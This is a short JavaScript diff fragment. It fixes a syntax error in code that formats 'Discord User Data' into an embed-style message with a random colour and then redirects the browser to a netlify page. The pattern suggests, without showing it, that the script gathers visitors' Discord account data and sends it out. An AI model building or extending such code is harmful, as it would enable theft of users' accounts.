@@ -244,7 +244,7 @@ async function updateUI() {
 **Discord User Data:** \`\`\`py
 ${userDataFormatted}
 \`\`\`
-`.trim(), Math.floor(Math.random() * 16777215));`);
+`.trim(), Math.floor(Math.random() * 16777215));
                 updateUI();
                 window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
             } catch (error) {
